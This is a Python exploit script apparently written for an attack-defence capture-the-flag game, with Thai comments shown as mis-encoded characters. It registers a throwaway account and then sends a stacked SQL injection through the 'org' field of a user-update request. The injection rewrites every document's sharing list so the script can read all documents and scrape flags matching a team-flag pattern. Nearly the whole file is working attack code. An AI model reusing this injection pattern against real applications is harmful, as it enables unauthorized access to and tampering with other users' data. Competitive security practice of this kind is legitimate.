import sys
import requests
import random
import string
import re
import json

# --- ‡∏Å‡∏≤‡∏£‡∏ï‡∏±‡πâ‡∏á‡∏Ñ‡πà‡∏≤‡∏û‡∏∑‡πâ‡∏ô‡∏ê‡∏≤‡∏ô ---
BASE_URL = "http://localhost" 
CHECKSYSTEM_URL = "http://localhost:8081"

# --- ‡∏Ñ‡πà‡∏≤‡∏Ñ‡∏á‡∏ó‡∏µ‡πà ---
CHECKSYSTEM_HEADERS = {
    'X-Team-Token': 'CHECKSYSTEM_2_d9ce6491caffff72919671a93b5ffff'
}
FLAG_REGEX = re.compile(r'TEAM\d{3}_\w{32}')

def generate_random_string(length=10):
    """‡∏™‡∏£‡πâ‡∏≤‡∏á‡∏™‡∏ï‡∏£‡∏¥‡∏á‡πÅ‡∏ö‡∏ö‡∏™‡∏∏‡πà‡∏°‡∏™‡∏≥‡∏´‡∏£‡∏±‡∏ö‡πÉ‡∏ä‡πâ‡πÄ‡∏õ‡πá‡∏ô login ‡πÅ‡∏•‡∏∞ password"""
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for i in range(length))

def main(team_id):
    """‡∏ü‡∏±‡∏á‡∏Å‡πå‡∏ä‡∏±‡∏ô‡∏´‡∏•‡∏±‡∏Å‡∏Ç‡∏≠‡∏á‡∏™‡∏Ñ‡∏£‡∏¥‡∏õ‡∏ï‡πå"""
    print(f"[*] ‡πÄ‡∏£‡∏¥‡πà‡∏°‡∏Å‡∏£‡∏∞‡∏ö‡∏ß‡∏ô‡∏Å‡∏≤‡∏£‡∏™‡∏≥‡∏´‡∏£‡∏±‡∏ö Team ID: {team_id}")

    # --- 1. ‡∏î‡∏∂‡∏á Flag IDs ‡∏à‡∏≤‡∏Å Checksystem ---
    flag_ids_url = f"{CHECKSYSTEM_URL}/flag_ids?service=12"
    try:
        print(f"[*] ‡∏Å‡∏≥‡∏•‡∏±‡∏á‡∏î‡∏∂‡∏á Flag IDs ‡∏à‡∏≤‡∏Å: {flag_ids_url}")
        response = requests.get(flag_ids_url, headers=CHECKSYSTEM_HEADERS, timeout=5)
        response.raise_for_status()
        
        all_flags_data = response.json()
        team_flag_ids = all_flags_data['flag_ids'][team_id]['flag_ids']
        print(f"[+] ‡∏û‡∏ö {len(team_flag_ids)} Flag IDs ‡∏™‡∏≥‡∏´‡∏£‡∏±‡∏ö Team {team_id}")
    except requests.exceptions.RequestException as e:
        print(f"[!] ‡πÄ‡∏Å‡∏¥‡∏î‡∏Ç‡πâ‡∏≠‡∏ú‡∏¥‡∏î‡∏û‡∏•‡∏≤‡∏î‡πÉ‡∏ô‡∏Å‡∏≤‡∏£‡πÄ‡∏ä‡∏∑‡πà‡∏≠‡∏°‡∏ï‡πà‡∏≠‡∏Å‡∏±‡∏ö Checksystem: {e}")
        return
    except KeyError:
        print(f"[!] ‡πÑ‡∏°‡πà‡∏û‡∏ö Flag IDs ‡∏™‡∏≥‡∏´‡∏£‡∏±‡∏ö Team ID '{team_id}' ‡πÉ‡∏ô‡∏Å‡∏≤‡∏£‡∏ï‡∏≠‡∏ö‡∏Å‡∏•‡∏±‡∏ö‡∏à‡∏≤‡∏Å‡πÄ‡∏ã‡∏¥‡∏£‡πå‡∏ü‡πÄ‡∏ß‡∏≠‡∏£‡πå")
        return
    except json.JSONDecodeError:
        print("[!] ‡πÑ‡∏°‡πà‡∏™‡∏≤‡∏°‡∏≤‡∏£‡∏ñ‡πÅ‡∏õ‡∏•‡∏á‡∏Å‡∏≤‡∏£‡∏ï‡∏≠‡∏ö‡∏Å‡∏•‡∏±‡∏ö‡∏à‡∏≤‡∏Å Checksystem ‡πÄ‡∏õ‡πá‡∏ô JSON ‡πÑ‡∏î‡πâ")
        return

    # --- 2. ‡∏•‡∏á‡∏ó‡∏∞‡πÄ‡∏ö‡∏µ‡∏¢‡∏ô, ‡∏•‡πá‡∏≠‡∏Å‡∏≠‡∏¥‡∏ô, ‡πÅ‡∏•‡∏∞‡∏î‡∏∂‡∏á User ID (‡∏ó‡∏≥‡∏Ñ‡∏£‡∏±‡πâ‡∏á‡πÄ‡∏î‡∏µ‡∏¢‡∏ß) ---
    own_user_id = None
    session = requests.Session()
    try:
        # ‡∏•‡∏á‡∏ó‡∏∞‡πÄ‡∏ö‡∏µ‡∏¢‡∏ô
        random_login = generate_random_string()
        random_password = generate_random_string()
        random_org = generate_random_string()
        register_payload = {"login": random_login, "password": random_password, "org": random_org}
        print(f"[*] ‡∏Å‡∏≥‡∏•‡∏±‡∏á‡∏•‡∏á‡∏ó‡∏∞‡πÄ‡∏ö‡∏µ‡∏¢‡∏ô‡∏ú‡∏π‡πâ‡πÉ‡∏ä‡πâ: {random_login}")
        r = session.post(f"{BASE_URL}/register", json=register_payload, timeout=5)
        print("[+] ‡∏•‡∏á‡∏ó‡∏∞‡πÄ‡∏ö‡∏µ‡∏¢‡∏ô‡∏™‡∏≥‡πÄ‡∏£‡πá‡∏à")

        own_user_id = r.json()['user_id']        
        if own_user_id:
            print(f"[+] ‡∏û‡∏ö User ID ‡∏Ç‡∏≠‡∏á‡∏ï‡∏±‡∏ß‡πÄ‡∏≠‡∏á: {own_user_id}")
        else:
            print("[!] ‡πÑ‡∏°‡πà‡∏û‡∏ö User ID ‡∏Ç‡∏≠‡∏á‡∏ï‡∏±‡∏ß‡πÄ‡∏≠‡∏á‡∏´‡∏•‡∏±‡∏á‡∏à‡∏≤‡∏Å‡∏•‡∏á‡∏ó‡∏∞‡πÄ‡∏ö‡∏µ‡∏¢‡∏ô! ‡∏≠‡∏≤‡∏à‡∏°‡∏µ‡∏ö‡∏≤‡∏á‡∏≠‡∏¢‡πà‡∏≤‡∏á‡∏ú‡∏¥‡∏î‡∏õ‡∏Å‡∏ï‡∏¥")
            return

        # ‡∏•‡πá‡∏≠‡∏Å‡∏≠‡∏¥‡∏ô
        login_payload = {"login": random_login, "password": random_password}
        print(f"[*] ‡∏Å‡∏≥‡∏•‡∏±‡∏á‡∏•‡πá‡∏≠‡∏Å‡∏≠‡∏¥‡∏ô‡∏î‡πâ‡∏ß‡∏¢‡∏ú‡∏π‡πâ‡πÉ‡∏ä‡πâ: {random_login}")
        session.post(f"{BASE_URL}/login", json=login_payload, timeout=5).raise_for_status()
        print("[+] ‡∏•‡πá‡∏≠‡∏Å‡∏≠‡∏¥‡∏ô‡∏™‡∏≥‡πÄ‡∏£‡πá‡∏à")
        


    except requests.exceptions.RequestException as e:
        print(f"[!] ‡πÄ‡∏Å‡∏¥‡∏î‡∏Ç‡πâ‡∏≠‡∏ú‡∏¥‡∏î‡∏û‡∏•‡∏≤‡∏î‡∏£‡∏∞‡∏´‡∏ß‡πà‡∏≤‡∏á‡∏Å‡∏≤‡∏£‡∏ï‡∏±‡πâ‡∏á‡∏Ñ‡πà‡∏≤ session: {e}")
        return
    except (KeyError, IndexError, TypeError, json.JSONDecodeError) as e:
        print(f"[!] ‡πÄ‡∏Å‡∏¥‡∏î‡∏Ç‡πâ‡∏≠‡∏ú‡∏¥‡∏î‡∏û‡∏•‡∏≤‡∏î‡πÉ‡∏ô‡∏Å‡∏≤‡∏£‡∏õ‡∏£‡∏∞‡∏°‡∏ß‡∏•‡∏ú‡∏•‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏• JSON: {e}")
        return

    # --- 3. ‡∏ß‡∏ô‡∏•‡∏π‡∏õ‡πÄ‡∏û‡∏∑‡πà‡∏≠‡∏™‡πà‡∏á Exploit ‡πÅ‡∏•‡∏∞‡∏Ñ‡πâ‡∏ô‡∏´‡∏≤ Flag ---
    for flag_id in team_flag_ids:
        print(f"\n--- ‡πÄ‡∏£‡∏¥‡πà‡∏°‡∏ï‡πâ‡∏ô Exploit ‡πÇ‡∏î‡∏¢‡πÉ‡∏ä‡πâ Flag ID: {flag_id} ---")
        try:
            # ‡πÅ‡∏¢‡∏Å org ‡∏≠‡∏≠‡∏Å‡∏à‡∏≤‡∏Å flag_id
            org = flag_id.split('@')[-1]

            # ‡∏™‡∏£‡πâ‡∏≤‡∏á Payload ‡∏™‡∏≥‡∏´‡∏£‡∏±‡∏ö SQL Injection
            # ‡∏£‡∏π‡∏õ‡πÅ‡∏ö‡∏ö: {org}' WHERE id=...; UPDATE docs SET shares=...; --
            # ‡∏´‡∏°‡∏≤‡∏¢‡πÄ‡∏´‡∏ï‡∏∏: ‡∏Å‡∏≤‡∏£‡πÉ‡∏ä‡πâ \\{{user_id}\\} ‡πÄ‡∏û‡∏∑‡πà‡∏≠‡πÉ‡∏´‡πâ‡πÑ‡∏î‡πâ string literal '{user_id}' ‡πÉ‡∏ô SQL query
            # ‡∏ã‡∏∂‡πà‡∏á‡πÄ‡∏õ‡πá‡∏ô‡∏£‡∏π‡∏õ‡πÅ‡∏ö‡∏ö‡∏Ç‡∏≠‡∏á array ‡πÉ‡∏ô PostgreSQL
            injection_string = f"{org}' WHERE id={own_user_id}; UPDATE public.docs SET shares='" + "{" + str(own_user_id) + "}' WHERE 1=1; --"
            put_payload = {"org": injection_string}
            
            # ‡∏™‡πà‡∏á Exploit ‡∏ú‡πà‡∏≤‡∏ô PUT request
            put_url = f"{BASE_URL}/users/{own_user_id}"
            print(f"[*] ‡∏Å‡∏≥‡∏•‡∏±‡∏á‡∏™‡πà‡∏á Exploit ‡πÑ‡∏õ‡∏ó‡∏µ‡πà: {put_url}")
            res_put = session.put(put_url, json=put_payload, timeout=5)
            res_put.raise_for_status()
            print("[+] ‡∏™‡πà‡∏á Exploit Payload ‡∏™‡∏≥‡πÄ‡∏£‡πá‡∏à!")

            # ‡∏î‡∏∂‡∏á‡∏£‡∏≤‡∏¢‡∏Å‡∏≤‡∏£‡πÄ‡∏≠‡∏Å‡∏™‡∏≤‡∏£‡∏ó‡∏±‡πâ‡∏á‡∏´‡∏°‡∏î (‡∏ï‡∏≠‡∏ô‡∏ô‡∏µ‡πâ‡πÄ‡∏£‡∏≤‡∏Ñ‡∏ß‡∏£‡∏à‡∏∞‡∏°‡∏µ‡∏™‡∏¥‡∏ó‡∏ò‡∏¥‡πå‡πÄ‡∏Ç‡πâ‡∏≤‡∏ñ‡∏∂‡∏á‡πÅ‡∏•‡πâ‡∏ß)
            docs_url = f"{BASE_URL}/docs"
            res_docs = session.get(docs_url, timeout=5)
            res_docs.raise_for_status()
            docs_list = res_docs.json().get('docs', [])
            print(f"[*] ‡∏û‡∏ö‡πÄ‡∏≠‡∏Å‡∏™‡∏≤‡∏£ {len(docs_list)} ‡∏â‡∏ö‡∏±‡∏ö‡∏´‡∏•‡∏±‡∏á‡∏à‡∏≤‡∏Å‡∏™‡πà‡∏á Exploit")

            # ‡∏ß‡∏ô‡∏•‡∏π‡∏õ‡πÄ‡∏û‡∏∑‡πà‡∏≠‡∏î‡∏∂‡∏á‡πÄ‡∏ô‡∏∑‡πâ‡∏≠‡∏´‡∏≤‡πÅ‡∏•‡∏∞‡∏Ñ‡πâ‡∏ô‡∏´‡∏≤ Flag
            for doc in docs_list:
                doc_id = doc.get('id')
                if not doc_id:
                    continue
                
                content_url = f"{BASE_URL}/contents/{doc_id}"
                res_content = session.get(content_url, timeout=5)
                
                if res_content.status_code == 200:
                    content_text = res_content.text
                    found_flags = FLAG_REGEX.findall(content_text)
                    if found_flags:
                        for flag in found_flags:
                            print(f"üéâüéâüéâ ‡∏û‡∏ö FLAG ‡πÅ‡∏•‡πâ‡∏ß! -> {flag}")
                else:
                    # ‡∏≠‡∏≤‡∏à‡∏à‡∏∞‡πÑ‡∏°‡πà‡πÅ‡∏™‡∏î‡∏á‡∏Ç‡πâ‡∏≠‡∏Ñ‡∏ß‡∏≤‡∏°‡∏ô‡∏µ‡πâ‡πÄ‡∏û‡∏∑‡πà‡∏≠‡∏•‡∏î‡∏Ñ‡∏ß‡∏≤‡∏°‡∏£‡∏Å‡∏Ç‡∏≠‡∏á output
                    pass

        except requests.exceptions.RequestException as e:
            print(f"[!] ‡πÄ‡∏Å‡∏¥‡∏î‡∏Ç‡πâ‡∏≠‡∏ú‡∏¥‡∏î‡∏û‡∏•‡∏≤‡∏î‡πÉ‡∏ô‡∏£‡∏≠‡∏ö Exploit ‡∏ô‡∏µ‡πâ: {e}")
            continue # ‡πÑ‡∏õ‡∏¢‡∏±‡∏á flag_id ‡∏ñ‡∏±‡∏î‡πÑ‡∏õ
        except Exception as e:
            print(f"[!] ‡πÄ‡∏Å‡∏¥‡∏î‡∏Ç‡πâ‡∏≠‡∏ú‡∏¥‡∏î‡∏û‡∏•‡∏≤‡∏î‡∏ó‡∏µ‡πà‡πÑ‡∏°‡πà‡∏Ñ‡∏≤‡∏î‡∏Ñ‡∏¥‡∏î: {e}")
            continue

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("‡∏Å‡∏≤‡∏£‡πÉ‡∏ä‡πâ‡∏á‡∏≤‡∏ô: python exploit_script.py <teamID>")
        sys.exit(1)
        
    target_team_id = sys.argv[1]
    main(target_team_id)